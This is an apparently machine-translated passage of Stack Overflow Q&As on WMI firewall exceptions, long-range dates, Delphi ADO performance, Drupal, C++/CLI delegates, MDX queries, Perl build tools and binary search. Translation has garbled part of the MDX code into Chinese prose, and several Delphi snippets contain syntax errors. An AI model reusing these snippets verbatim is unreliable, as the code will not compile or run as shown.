3389   TCP       Enable   Remote Desktop

Log configuration:
-------------------------------------------------------------------
File location   = C:\WINDOWS\pfirewall.log
Max file size   = 4096 KB
Dropped packets = Disable
Connections     = Disable

Bluetooth Network Connection firewall configuration:
-------------------------------------------------------------------
Operational mode                  = Enable

Local Area Connection firewall configuration:
-------------------------------------------------------------------
Operational mode                  = Enable

Wireless Network Connection firewall configuration:
-------------------------------------------------------------------
Operational mode                  = Enable

1394 Connection firewall configuration:
-------------------------------------------------------------------
Operational mode                  = Enable 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T19:00:22.477

对此的一般修复是允许防火墙内置的“远程管理”例外。问题是 WMI 使用 RPC 终结点映射器，因此涉及多个端口。[http://msdn.microsoft.com/en-us/library/aa389286(VS.85).aspx](http://msdn.microsoft.com/en-us/library/aa389286(VS.85).aspx)可能是关于该主题的最终讨论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-17T03:18:31.847

当机器登录到域时，域设置应该是活动的。其他时间运行时的标准设置。作为测试，我建议首先在 GUI 中进行设置 - 更容易看到发生了什么并确认事情“发生了”。我还将向两个配置文件添加例外 - 再次作为测试。阅读有关域和标准模式的产品内帮助；您需要查看一些细节以查看机器上哪个处于活动状态，并且文档提供了一个很好的演练。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-07-25T18:11:01.180

我发现在我们的网络上，即使通过 gpo 启用了远程管理，Vista 和 Win 7 机器也需要以下设置：

Windows 防火墙：允许 ICMP 例外（已启用）- 允许入站回显请求（已启用）

启用远程管理时，该设置应该是多余的，但由于某种原因似乎是必要的。

# datetime - 如果我想使用过去/未来数百万年的日期和时间来工作，我会怎么做？

> ID：369180
> 
> 赞同：3
> 
> 时间：2008-12-15T17:51:23.770
> 
> 标签：datetime, date, time-management, scientific-computing

如果我想使用过去/未来数百万年的日期和时间来工作，我将如何在 C/C++/C# 中做到这一点？

例如，假设我正在研究一种算法来查看彗星是否会撞击地球？是否有商业或开源库可以做到这一点？

大多数 DateTime 值只能使用几年。Unix 将在 2038 年用完！

托尼

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-15T17:57:15.723

天文学家使用自己的日历，不同于民间的公历。

[天文儒略日期](http://scienceworld.wolfram.com/astronomy/JulianDate.html)是他们使用的。

看看[http://en.wikipedia.org/wiki/Julian_day](http://en.wikipedia.org/wiki/Julian_day)

这是一个典型的包装：[太阳能时钟](http://sourceforge.net/projects/solarclock/)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-12-15T18:09:47.133

[由于存在闰秒](http://en.wikipedia.org/wiki/Leap_second)（其中一个定于 12 月 31 日，距现在几周），您无法将未来的 UTC 日期精确到秒。没有人知道闰秒何时会添加到日历中，因为没有人知道未来地球自转的速度会继续减慢。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-15T18:01:43.577

好吧，不要直言不讳，但如果它会在 1700 年后撞击地球，我认为我们不需要知道实际日期。

除非是星期二。

永远无法掌握星期二的窍门。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-12-15T18:11:17.363

如果典型日期时间变量提供的时间跨度太小，您有两种选择：

1.  使用更大范围的变量（即更多位）
2.  允许较低的精度

你应该选择哪一个取决于你到底想做什么。但总的来说，我的建议是选项 2。当我们谈论世纪或千年时，毫秒通常并不那么重要......

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-16T10:51:05.897

谈到天文事件时，地球的哪一部分面向太阳并不重要，即有日光。因此，日历和日期也无关紧要。你应该简单地使用时间。例如 64 位 time_t 就足够了。

即使你确实使用时间，请记住，三体系统（如地球-太阳-木星）是混乱的。在遥远的未来预测地球的位置有相当大的误差。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2010-05-25T13:14:32.767

64 位 time_t 将一直工作到 292,277,026,596 年。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T17:56:39.813

您只需要更多位来存储值和/或使用更大的时间增量来表示时间戳。如果这还不够（并且取决于您的精度要求）或使用浮点数，则可以使用为非常大的数字设计的数学库/API，而不是 ms。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-15T18:38:51.973

C# 中的 DateTime 对象从 1.1.0001 变为 12.31.9999。在最早日期为 1735 年之类的 SQL Server 中，它甚至更受限制。

您几乎将不得不自己写一些东西或尝试从其他人那里收集一些东西。前进可能更容易（除了闰秒之外）。这里有一些关于日历的非常好的[信息](http://www.tondering.dk/claus/calendar.html)。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-16T10:23:46.293

我认为问题在于不知道彗星会在周五还是周日撞击，而是彗星是否会撞击。我想这意味着您可以将千分之一秒的时间建模为 64 位 long long 类型。你可以解决2130亿年。然后，您可以有一个例程，将其映射回有意义的完整日期......

# performance - Delphi 中的 BDE 与 ADO

> ID：369187
> 
> 赞同：13
> 
> 时间：2008-12-15T17:55:47.223
> 
> 标签：performance, oracle, delphi, ado, bde

**请注意下面的编辑以获取更多信息以及可能的解决方案**

我们最近修改了一个大型 Delphi 应用程序以使用 ADO 连接和查询而不是 BDE 连接和查询。自那次改变以来，性能变得很糟糕。

我已经分析了应用程序，瓶颈似乎在实际调用`TADOQuery.Open`. 换句话说，从代码的角度来看，除了重构应用程序以减少对数据库的使用之外，我无能为力。

有人对如何提高与 ADO 连接的 Delphi 应用程序的性能有任何建议吗？我已经尝试了[这里给出的两个建议](http://dn.codegear.com/print/27790)，几乎没有影响。

为了了解性能差异，我对相同的大型操作进行了基准测试：

*   在 BDE 下：11 秒

*   在 ADO 下：73 秒

*   该文章引用的更改后的 ADO 下：72 秒

我们在客户端-服务器环境中使用 Oracle 后端。每个本地机器都与数据库保持单独的连接。

作为记录，连接字符串如下所示：

```
const
  c_ADOConnString = 'Provider=OraOLEDB.Oracle.1;Persist Security Info=True;' +
                    'Extended Properties="plsqlrset=1";' +
                    'Data Source=DATABASE.DOMAIN.COM;OPTION=35;' +
                    'User ID=******;Password=*******'; 
```

要回答 zendar 提出的问题：

我在 Windows Vista 和 XP 上使用 Delphi 2007。

后端是一个Oracle 10g 数据库。

如连接字符串所示，我们使用的是 OraOLEDB 驱动程序。

我的基准机器上的 MDAC 版本是 6.0。

**编辑：**

在 BDE 下，我们有很多看起来像这样的代码：

```
procedure MyBDEProc;
var
  qry: TQuery;
begin
  //fast under BDE, but slow under ADO!!
  qry := TQuery.Create(Self);
  try
    with qry do begin
      Database := g_Database;
      Sql.Clear;
      Sql.Add('SELECT');
      Sql.Add('  FIELD1');
      Sql.Add(' ,FIELD2');
      Sql.Add(' ,FIELD3');
      Sql.Add('FROM');
      Sql.Add('  TABLE1');
      Sql.Add('WHERE SOME_FIELD = SOME_CONDITION');
      Open;
      //do something
      Close;
    end;  //with
  finally
    FreeAndNil(qry);
  end;  //try-finally
end;  //proc 
```

但是我们发现`Sql.Add`在 ADO 下调用到实际上是非常昂贵的，因为`QueryChanged`每次更改`CommandText`. 所以用这个替换上面的内容要快得多：

```
procedure MyADOProc;
var
  qry: TADOQuery;
begin
  //fast(er) under ADO
  qry := TADOQuery.Create(Self);
  try
    with qry do begin
      Connection := g_Connection;
      Sql.Text := ' SELECT ';
        + '   FIELD1 '
        + '  ,FIELD2 '
        + '  ,FIELD3 '
        + ' FROM '
        + '  TABLE1 '
        + ' WHERE SOME_FIELD = SOME_CONDITION ';
      Open;
      //do something
      Close;
    end;  //with
  finally
    FreeAndNil(qry);
  end;  //try-finally
end;  //proc 
```

更好的是，您可以复制`TADOQuery`ADODB.pas，将其重命名为新名称，然后删除`QueryChanged`事件，据我所知，这根本没有做任何有用的事情。然后使用新的、修改后的 TADOQuery 版本，而不是本机版本。

```
type
  TADOQueryTurbo = class(TCustomADODataSet)
  private
    //
  protected
    procedure QueryChanged(Sender: TObject);
  public
    FSQL: TWideStrings;
    FRowsAffected: Integer;
    function GetSQL: TWideStrings;
    procedure SetSQL(const Value: TWideStrings);
    procedure Open;
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
    function ExecSQL: Integer; {for TQuery compatibility}
    property RowsAffected: Integer read FRowsAffected;
  published
    property CommandTimeout;
    property DataSource;
    property EnableBCD;
    property ParamCheck;
    property Parameters;
    property Prepared;
    property SQL: TWideStrings read FSQL write SetSQL;
  end;
////////////////////////////////////////////////////////
////////////////////////////////////////////////////////
////////////////////////////////////////////////////////
constructor TADOQueryTurbo.Create(AOwner: TComponent);
begin
  inherited Create(AOwner);
  FSQL := TWideStringList.Create;
  TWideStringList(FSQL).OnChange := QueryChanged;
  Command.CommandText := 'SQL'; { Do not localize }
end;

destructor TADOQueryTurbo.Destroy;
begin
  inherited;
 inherited Destroy;
  FreeAndNil(FSQL);
end;

function TADOQueryTurbo.ExecSQL: Integer;
begin
  CommandText := FSQL.Text;
  inherited;
end;

function TADOQueryTurbo.GetSQL: TWideStrings;
begin
  Result := FSQL;
end;

procedure TADOQueryTurbo.Open;
begin
  CommandText := FSQL.Text;
  inherited Open;
end;

procedure TADOQueryTurbo.QueryChanged(Sender: TObject);
begin
// if not (csLoading in ComponentState) then
//    Close;
// CommandText := FSQL.Text;
end;

procedure TADOQueryTurbo.SetSQL(const Value: TWideStrings);
begin
  FSQL.Assign(Value);
  CommandText := FSQL.Text;
end; 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-12-15T18:23:17.557

我不了解 Delphi 2007，但我对 Delphi 7 和 Oracle 8 做了同样的事情。

以下是我做的事情：

*   根据查询 设置**TAdoDataSet.CursorLocation ：**
    *   ***clUseClient***如果查询获取 GUI 的记录并且查询相对“简单” - 没有分组或求和
    *   ***clUseServer***如果查询有某种聚合（求和、分组、计数）
*   根据查询 设置**TAdoDataSet.CursorType ：**
    *   ***ctForwardOnly***用于不需要向后滚动数据集的报告 - 仅适用于*clUseServer*
    *   *用于 GUI 的***ctStatic 。***这是唯一适用于*clUseClient的模式**

**   根据查询 设置**TAdoDataSet.LockType ：**
    *   ***ltReadOnly***用于不用于编辑的每个数据集（网格、报告）
    *   ***lt***当记录在更改后立即发布到数据库时是乐观的（例如用户在表单上编辑数据）
    *   ***ltBatchOptimistic***当您更改大量记录时。这适用于您获取记录数，然后对它们进行一些处理，然后将更新批量发送到数据库的情况。这与 clUseClient 和 ctStatic 结合使用效果最好。*   以我的经验，Oracle 的 Microsoft OLEDB 提供商比 Oracle OleDb 提供商工作得更好。你应该测试一下。
    **编辑：**检查 Fabricio 关于可能出现的斑点问题的评论。*   将***TAdoQUery***替换为***TAdoDataSet***。TAdoQuery 是为将应用程序从 BDE 转换为 ADO 而创建的，但 Borland/Codegear 建议使用 TAdoDataSet*   重新检查 Oracle 连接字符串以确保您没有网络延迟。连接到 Oracle 需要多长时间？TnsPing 多长时间？*

 ** * *

## 回答 #2

> 赞同：5
> 
> 时间：2011-07-16T14:52:29.407

几年前我发现了 ADOExpress 的性能问题：

*   [ADO 与 ADOExpress 计时赛。不适合 ADOExpress](http://groups.google.com/group/borland.public.delphi.database.ado/browse_thread/thread/c912b61b28472829) (6/7/2005)
*   [ADO 与 ADO Express 计时赛 (redux)](http://groups.google.com/group/borland.public.delphi.database.ado/browse_thread/thread/5932d926801a407f/720a59662558ad05) (12/30/2007)

> **注意：**在 ADO 成为 Delphi 的标准部分之前，Borland 将其作为名为**ADOExpress**的插件出售。它只是 Microsoft 的 ActiveX 数据对象 (ADO) COM 对象的对象包装器。

我测试了三个场景

*   直接使用ADO（即直接使用微软的COM对象）
*   使用 ADOExpress（Borland 的 ADO 对象包装器）
*   `.DisableControls`在`TADOQuery`调用之前指定`Open`

我发现

*   用于`Query.DisableControls`使每次通话`.Next`速度提高 50 倍
*   使用`Query.Recordset.Fields.Items['columnName'].Value`而不是`Query.FieldByName('columnName')`使每个值查找速度提高 2.7 倍
*   使用`TADODataSet`(verses `TADOQuery`) 没有区别

    ```
     Loop Results        Get Values 
    ADOExpress:                         28.0s              46.6s 
    ADOExpress w/DisableControls:        0.5s              17.0s 
    ADO (direct use of interfaces):      0.2s               4.7s 
    ```

**注意**：这些值用于循环 20,881 行，并查找 21 列的值。

**基线错误代码：**

```
var
   qry: TADOQuery;
begin
   qry := TADOQuery.Create(nil);
   try
      qry.SQL.Add(CommandText);
      qry.Open;
      while not qry.EOF do
      begin
         ...
         qry.Next;
      end; 
```

**使用 DisableControls 使循环速度提高 5000%**：

```
var
   qry: TADOQuery;
begin
   qry := TADOQuery.Create(nil);
   try 
      qry.DisableControls;
      qry.SQL.Add(CommandText);
      qry.Open;
      while not qry.EOF do
      begin
         ...
         qry.Next;
      end; 
```

**使用 Fields 集合使值查找速度提高 270%**：

```
var
   qry: TADOQuery;
begin
   qry := TADOQuery.Create(nil);
   try 
      qry.DisableControls;
      qry.SQL.Add(CommandText);
      qry.Open;
      while not qry.EOF do
      begin
         value1 := VarAsString(qry.Recordset.Fields['FieldOne'].Value);
         value2 := VarAsInt(qry.Recordset.Fields['FieldTwo'].Value);
         value3 := VarAsInt64(qry.Recordset.Fields['FieldTwo'].Value);
         value4 := VarAsFloat(qry.Recordset.Fields['FieldThree'].Value);
         value5 := VarAsWideString(qry.Recordset.Fields['FieldFour'].Value);
         ...
         value56 := VarAsMoney(qry.Recordset.Fields['FieldFive'].Value);
         qry.Next;
      end; 
```

* * *

由于这是一个很常见的问题，我们创建了一个辅助方法来解决这个问题：

```
class function TADOHelper.Execute(const Connection: TADOConnection; 
       const CommandText: WideString): TADOQuery;
var
   rs: _Recordset;
   query: TADOQuery;
   nRecords: OleVariant;
begin
   Query := TADOQuery.Create(nil);
   Query.DisableControls; //speeds up Query.Next by a magnitude
   Query.Connection := Connection;
   Query.SQL.Text := CommandText;
   try
      Query.Open();
   except
      on E:Exception do
      begin
         Query.Free;
         raise;
      end;
   end;
   Result := Query;
end; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-07-11T06:15:02.737

为了获得最佳性能，应该看看我们的[Open Source direct access to Oracle](http://blog.synopse.info/post/2011/07/09/SynDBOracle:-Open-Source-native-Oracle-access)。

如果您正在处理大量 TQuery，而不使用 DB 组件，我们有一个专用的伪类来使用直接 OCI 连接，如下所示：

```
 Q := TQuery.Create(aSQLDBConnection);
 try
   Q.SQL.Clear; // optional
   Q.SQL.Add('select * from DOMAIN.TABLE');
   Q.SQL.Add('  WHERE ID_DETAIL=:detail;');
   Q.ParamByName('DETAIL').AsString := '123420020100000430015';
   Q.Open;
   Q.First;    // optional
   while not Q.Eof do begin
     assert(Q.FieldByName('id_detail').AsString='123420020100000430015');
     Q.Next;
   end;
   Q.Close;    // optional
 finally
   Q.Free;
 end; 
```

而且我通过后期绑定变体添加了一些独特的访问，以编写直接代码：

```
procedure Test(Props: TOleDBConnectionProperties; const aName: RawUTF8);
var I: ISQLDBRows;
    Customer: Variant;
begin
  I := Props.Execute('select * from Domain.Customers where Name=?',[aName],@Customer);
  while I.Step do
    writeln(Customer.Name,' ',Customer.FirstName,' ',Customer.Address);
end;

var Props: TOleDBConnectionProperties;
begin
  Props := TSQLDBOracleConnectionProperties.Create(
    'TnsName','UserName','Password',CODEPAGE_US);
  try
    Test(Props,'Smith');
  finally
    Props.Free;
  end;
end; 
```

请注意，所有 OleDB 提供程序在处理 BLOB 时都存在错误：Microsoft 的版本只是不处理它们，Oracle 的版本将[随机返回 1/4 行的 null](https://stackoverflow.com/questions/6147274/is-oraoledb-provider-in-net-unreliable-on-clob-fields) ...

在真实数据库上，我发现我们的直接 OCI 类比 OleDB 提供程序快 2 到 5 倍，而无需安装此提供程序。您甚至可以使用 Oracle 提供的[Oracle Instant Client](http://www.oracle.com/technetwork/database/features/instant-client)，它允许您在不安装标准（大型）Oracle 客户端或拥有 ORACLE_HOME 的情况下运行应用程序。只需将 dll 文件与您的应用程序放在同一目录中，它就可以工作。

# drupal - 如何在 Drupal 中添加和关联父节点中的节点添加表单

> ID：369189
> 
> 赞同：1
> 
> 时间：2008-12-15T17:57:00.980
> 
> 标签：drupal, inline, editing, relate

我想在 Drupal 中完成以下场景：

您有 2 种内容类型。比方说，一个许可证的申请表和一个人的内容类型。

然后，当您在 Drupal 的“节点/添加”提交表单中添加许可时，我想添加与此许可相关的相对数量的人员，并且仅添加此许可。假设您想申请 lisence，并将 4 人与此 lisence 相关联，然后创建 lisence，然后创建 4 人并将他们与 lisence 相关联，我想做这个“内联”。

所以当我添加一个许可时，会有一种方法可以添加一个或多个与许可节点相关的人。这可能吗，如果可以，怎么办？

我一直在查看节点引用模块，它设法将一个节点引用到另一个节点，但没有将它们与另一个内联添加。

使用网络开发框架 Django，有一种称为“内联编辑”的方法，您可以在另一个内容类型创建表单中获取内容类型字段。在那里，您将它们与 ForeignKey 绑定在一起。

任何人都知道 Drupal 中类似的东西，如果不知道，它是另一种实现类似东西的方法，那将是用户友好的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-17T21:47:29.373

[弹出窗口：添加和引用](http://drupal.org/project/popups_reference)模块最近得到了改进，我认为它可能会满足您的需求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-01-11T19:50:24.067

尝试[节点关系](http://drupal.org/project/noderelationships)，它将在节点引用字段旁边添加编辑/查看/添加按钮，并弹出一个模式。确保检查模块依赖项。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-17T22:15:05.390

我已经研究过了，这似乎是不可能的。我查看了 reference_create 模块，并在 drupal.org 上搜索和发布了一些东西，但没有人有好的解决方案。

所以我刚刚在大约 3 小时内用 Django 重建了整个东西；所以，明天我会试着说服我的雇主走 Django 的路！

# generics - 为什么 C# 可以做到这一点而 C++/CLI 不能？

> ID：369191
> 
> 赞同：0
> 
> 时间：2008-12-15T17:57:11.527
> 
> 标签：generics, delegates, c++-cli

.NET Framework 3.5 附带所有 LINQ 好东西，还包括预定义的通用 Func 和 Action 委托。它们对于最多 4 个参数是通用的。我正在编写一个 C++/CLI 项目，该项目（不幸的是）使用 VS 2005，并且必须只依赖于标准的 2.0 程序集集（所以没有 System.Core）。

我尝试定义我自己的通用委托（在我自己的命名空间中），以使未来的端口更容易，通过编译器阻塞（多个定义）。有什么建议么？

```
delegate void Action();

generic <typename Arg1>
delegate void Action(Arg1 arg1); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T18:27:39.733

我在这里猜测，但我认为你最好的选择是在 C# 程序集中只定义那些委托。C++/CLI 使用这样的重载泛型系列没有问题，但似乎无法定义它们。

# c# - 有没有办法在 VS 调试器中自定义自定义对象的工具提示？

> ID：369192
> 
> 赞同：3
> 
> 时间：2008-12-15T17:57:11.900
> 
> 标签：c#, visual-studio, debugging

假设您有一个自定义类，称为 Foo。然后，当您拥有此类的实例时，在调试期间，如果您将鼠标悬停在此对象上，您将看到该类型的完全限定名称空间名称，或者如果您在此类中覆盖 ToString，您将看到它。有什么方法可以自定义工具提示的内容吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-15T18:10:28.317

是的，请查看 MSDN 文章[*Enhancing Debugging with the Debugger Display Attributes*](http://msdn.microsoft.com/en-us/library/ms228992.aspx)，它提供：

*   [`DebuggerDisplayAttribute`](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggerdisplayattribute.aspx)- 计算要显示的字符串
*   [`DebuggerBrowsableAttribute`](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggerbrowsableattribute.aspx)- 指出应该显示哪些成员
*   [`DebuggerTypeProxyAttribute`](http://msdn.microsoft.com/en-us/library/system.diagnostics.debuggertypeproxyattribute.aspx)- 指示提供要显示的数据的单独类型。

# sql-server-2005 - MDX where 子句中的多维限制

> ID：369198
> 
> 赞同：0
> 
> 时间：2008-12-15T17:59:23.940
> 
> 标签：sql-server-2005, mdx

我有以下问题。如果我使用作为函数的关键图查询值，我无法指定相同维度限制的多个值，但如果它不是函数，则它可以工作。

所以这有效：

```
SELECT {[Measures].[Netto]} on columns FROM TDC where
({NonEmpty([Time].[Month].[Month].&[2008-03-01T00:00:00]), 
  NonEmpty([Time].[Month].[Month].&[2008-04-01T00:00:00])}) 
```

但这不会：

```
SELECT {[Measures].[CalculatedFunction]} on columns FROM TDC where
({NonEmpty([Time].[Month].[Month].&[2008-03-01T00:00:00]), 
 NonEmpty([Time].[Month].[Month].&[2008-04-01T00:00:00])}) 
```

这也有效：

```
SELECT {[Measures].[CalculatedFunction]} on columns FROM TDC where 
({NonEmpty([Time].[Month].[Month].&[2008-03-01T00:00:00])}) 
```

我想解决方案类似于将 where 子句添加到标题中，但我真的很喜欢这个解决方案，因为它非常简单。

计算函数为：

```
CREATE MEMBER CURRENTCUBE.[MEASURES].Ultimo
AS (iif ((not [Time].[Year - Month - Date].currentmember is [Time].[Year - Month - Date].defaultmember),
IIF(NOT ([Measures].[LagerStk] = 0),
Sum([Time].[Year - Month - Date].[Date].members(0):
ClosingPeriod([Time].[Year - Month - Date].[Date]),
[Measures].[LagerStk]), NULL)
, 
IIF(NOT ([Measures].[LagerStk] = 0),
Sum([Time].[Year - Week - Date].[Date].members(0):
ClosingPeriod([Time].[Year - Week - Date].[Date]),
[Measures].[LagerStk]), NULL))), 
VISIBLE = 1; 
```

该代码受此启发，并针对时间维度中的两个层次结构进行了修改：[http ://www.sqlserveranalysisservices.com/OLAPPapers/InventoryManagement%20in%20AS2005v2.htm](http://www.sqlserveranalysisservices.com/OLAPPapers/InventoryManagement%20in%20AS2005v2.htm)

这是在 SQL Server 2005 企业版上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-16T16:41:03.833

好的，这有效：

```
WITH MEMBER [Time].[Month].a AGGREGATE 
({[Time].[Month].[Month].&[2008-03-01T00:00:00], 
  [Time].[Month].[Month].&[2008-04-01T00:00:00]})
SELECT {[Measures].[CalculatedFunction]} on columns FROM TDC where a 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-04T03:54:34.707

问题在于您的计算量度。您正在使用 .CurrentMember 和 ClosingPeriod 而没有特定的成员引用，这意味着调用 .CurrentMember。当您在 WHERE 子句中设置时，没有“当前”成员 - 有多个当前成员。将您的 MDX 重写为以下内容应该允许它与 WHERE 子句中的多个成员一起使用。

```
CREATE 
  MEMBER CURRENTCUBE.[MEASURES].Ultimo AS NULL;

SCOPE ([MEASURES].Ultimo);
      SCOPE ([Time].[Year - Month - Date].[All]);
        this = IIF
          (
            (NOT 
              [Measures].[LagerStk] = 0)
           ,Sum
            (
             NULL:Tail(Existing [Time].[Year - Week - Date].[Date],1).item(0).item(0)
             ,[Measures].[LagerStk]
            )
           ,NULL
          );
      END SCOPE;

      SCOPE ([Time].[Year - Week - Date].[All]);
        this = IIF
          (
            (NOT 
              [Measures].[LagerStk] = 0)
           ,Sum
            (
             NULL:Tail(Existing [Time].[Year - Month - Date].[Date],1).Item(0).Item(0)
             ,[Measures].[LagerStk]
            )
           ,NULL
          )
        ); 
     END SCOPE;
END SCOPE; 
```

我在两个维度的所有成员上使用 SCOPE，这应该很快，out IIF 并且还将避免对 .CurrentMember 的一次引用。**然后我用Tail(Existing [Time].[Year - Week - Date].[Date],1).item(0).item(0)**替换了**ClosingPeriod()**调用，这样做是为了获取日期集当前上下文中存在的成员，Tail() 调用然后将这些中的最后一个作为单个成员集获取，并且 .Item(0).Item(0) 调用从该集合的第一个元组中获取第一个成员。

 **显然，无法访问您的多维数据集，我无法测试任何这些。您在评论中报告的问题可能与对所有成员的错误引用有关（我可能与您的多维数据集中的命名格式不同），也可能与 IIF() 语句有关。我不确定是否在正确的上下文中评估了对 0 的检查

您可以尝试不使用 IIF() 进行测试

创建成员CURRENTCUBE.[MEASURES].Ultimo AS NULL；

范围（[措施].Ultimo）；范围（[时间].[年-月-日].[全部]）；this = Sum ( NULL:Tail(现有 [时间].[年 - 周 - 日期].[日期],1).item(0).item(0) ,[Measures].[LagerStk] ); 结束范围；

```
 SCOPE ([Time].[Year - Week - Date].[All]);
    this = Sum
        (
         NULL:Tail(Existing [Time].[Year - Month - Date].[Date],1).Item(0).Item(0)
         ,[Measures].[LagerStk]
        ); 
 END SCOPE; 
```

结束范围；

# perl - 我应该使用 Module::Install 还是 Module::Build？

> ID：369209
> 
> 赞同：8
> 
> 时间：2008-12-15T18:07:26.967
> 
> 标签：perl, module

[我正在用 Perl 编写一个名为Kephra](http://kephra.sourceforge.net/)的程序员文本编辑器（是的另一个），它当然也是一个 CPAN 模块，并与[Module::Install](http://cpanratings.perl.org/dist/Module-Install)捆绑在一起。最近我看到[Module::Build](http://cpanratings.perl.org/dist/Module-Build)已经进入核心，所以如果我切换我可以减少依赖。有没有其他理由转行？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-18T14:57:15.220

我们在我们的组中使用[Module::Build 。](http://search.cpan.org/dist/Module-Build/)

主要原因是**易于扩展**。

Module::Build 允许您通过子类化在纯 Perl 中使用构建过程做更多事情。如果您想使用[Module::Install](http://cpanratings.perl.org/dist/Module-Install)做更多事情，您必须了解 Makefile 的工作原理，AFAIK。由于您大概已经了解 Perl，因此这可能是一个优势。

正如您所说，使用 Module::Build 消除了对外部`make`程序的依赖，这可以看作是一件好事。

但是，我能想到的主要缺点是：

*   尽管 Module::Build 已经成为核心，但并不是每个人都会使用最新版本的 Perl。对于使用旧版本核心的用户，您将创建一个新的依赖项。
*   许多老手（不一定是 Perl 人）已经习惯了这种`perl Makemaker.PL; make; make install`范式，并且可能会因为拥有而被抛弃`Build.PL`。希望这不是什么大问题。
*   Module::Build 偶尔会在其功能发生变化时破坏我们的构建，因为文档没有涵盖我们正在使用的边缘情况。然后更改并记录了边缘情况，但我们必须重新编码我们的子类以使我们的构建再次工作（这发生在我们最近从 0.2808 升级到 0.3 时）。

尽管如此，我仍然推荐 Module::Build 只是为了可扩展性。如果这对您来说不是问题，那么您最好还是坚持使用 Module::Install。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-15T18:12:19.123

嗯，`Module::Build`是一个相当不错的模块，它应该是一个替代品`ExtUtils::MakeMaker`，也就是说，将 Makefile.PL 替换为 Build.PL，生成一个 Build 而不是 Makefile。这也意味着“简单的事情应该保持简单，困难的事情应该成为可能”。

`Module::Install`采用不同的方法并生成一个 Makefile。

另外，不要忘记不是每个人都运行最新版本的一切:-)

我不记得这些模块的任何比较，但我认为您可以从相应的 cpanratings 页面中找到一些[`Module::Build`](http://cpanratings.perl.org/dist/Module-Build)东西[`Module::Install`](http://cpanratings.perl.org/dist/Module-Install)。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-15T19:44:37.847

之前已经在[“我应该使用哪个框架来编写模块？”中对此进行了一些解释。](https://stackoverflow.com/questions/73889/which-framework-should-i-use-to-write-modules)

吐出反刍后，我决定使用[Module::Build](http://search.cpan.org/dist/Module-Build/)但显然可能有不同的答案！（尽管到目前为止我对 M::B 很满意）。

# c++ - std 库中有什么函数可以对向量进行二进制搜索并找到一个元素？

> ID：369211
> 
> 赞同：6
> 
> 时间：2008-12-15T18:07:50.820
> 
> 标签：c++, vector, std, binary-search

我有一个节点结构

```
struct Node{CString text, int id;}; 
```

在一个排序的向量中。

我想知道算法中是否有一个函数可以对向量进行二进制搜索并找到一个元素。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-12-15T18:28:49.747

`std::binary_search()`将告诉您容器中是否存在值。

`std::lower_bound()/std::upper_bound()`将迭代器返回到值的第一次/最后一次出现。

您的对象需要实现`operator<`这些算法才能工作。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-12-15T18:15:58.667

是的，有一个名为“binary_search”的函数 std::binary_search

你先给它，最后给它一个值或一个谓词。

请参阅[此处](http://www.java2s.com/Tutorial/Cpp/0520__STL-Algorithms-Binary-search/Usebinarysearchtolocateavalueinavector.htm)获取示例

将它与[Martin York 的](https://stackoverflow.com/questions/369211/is-there-a-search-in-algorithm-ive-got-a-sorted-vector-and-im-looking-for-speci#369237)operator== 结合起来，你应该没问题（或者你可以编写一个谓词函子

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T18:30:03.880

而不是排序的 vector<Node>
为什么不使用地图。这是一个分类容器。因此，通过 std::find() 对此进行的任何搜索都会自动具有与二进制搜索相同的属性。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-05T02:46:10.143

用于`std::equal_range`查找已排序向量中的一系列元素。 `std::equal_range`返回一个`std::pair`迭代器，为您提供与您提供的参数相等的元素向量范围。如果范围为空，则您的项目不在向量中，范围的长度告诉您项目在向量中出现的次数。

这是一个使用 ints 而不是 的示例`struct Node`：

```
#include <iostream>
#include <algorithm>
#include <vector>
#include <string>

int main(int argc, const char * argv[])
{
    std::vector<int> sorted = { 1, 2, 2, 5, 10 };

    auto range = std::equal_range(sorted.begin(), sorted.end(), 20);
    // Outputs "5 5"
    std::cout << std::distance(sorted.begin(), range.first) << ' '
              << std::distance(sorted.begin(), range.second) << '\n';

    range = std::equal_range(sorted.begin(), sorted.end(), 5);
    // Outputs "3 4"
    std::cout << std::distance(sorted.begin(), range.first) << ' '
              << std::distance(sorted.begin(), range.second) << '\n';

    range = std::equal_range(sorted.begin(), sorted.end(), -1);
    // Outputs "0 0"
    std::cout << std::distance(sorted.begin(), range.first) << ' '
              << std::distance(sorted.begin(), range.second) << '\n';

    return 0;
} 
```

要使这项工作与`struct Node`您一起工作，您必须提供一个`operator <` for`struct Node`或将比较器传递给`std::equal_range`. 您可以通过提供 lambda 作为参数`std::equal_range`来比较您的结构来做到这一点。

```
std::vector<Node> nodes = { Node{"hello", 5}, Node{"goodbye", 6} };
Node searchForMe { "goodbye", 6 };
auto range = std::equal_range(nodes.begin(), nodes.end(), searchForMe,
                               [](Node lhs, Node rhs) { return lhs.id < rhs.id; }); 
```

